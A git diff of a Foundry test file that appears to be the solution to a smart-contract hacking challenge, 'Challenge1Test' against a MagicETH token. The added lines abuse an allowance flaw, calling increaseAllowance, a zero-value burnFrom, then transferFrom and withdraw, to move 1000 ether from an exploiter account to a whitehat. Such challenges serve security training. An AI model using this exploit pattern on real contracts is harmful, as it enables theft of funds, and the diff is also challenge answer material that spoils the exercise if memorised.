@@ -2,13 +2,13 @@
 pragma solidity ^0.8.13;
 
 import "forge-std/Test.sol";
+import "forge-std/console.sol";
 import {MagicETH} from "../src/1_MagicETH/MagicETH.sol";
 
 /*////////////////////////////////////////////////////////////
 //          DEFINE ANY NECESSARY CONTRACTS HERE             //
 //    If you need a contract for your hack, define it below //
 ////////////////////////////////////////////////////////////*/
-
 
 
 /*////////////////////////////////////////////////////////////
@@ -37,7 +37,10 @@ contract Challenge1Test is Test {
         // forge test --match-contract Challenge1Test -vvvv //
         ////////////////////////////////////////////////////*/
 
-    
+        mETH.increaseAllowance(exploiter, 1000 ether);
+        mETH.burnFrom(exploiter, 0 ether);
+        mETH.transferFrom(exploiter, whitehat, 1000 ether);
+        mETH.withdraw(1000 ether);
 
         //==================================================//
         vm.stopPrank();
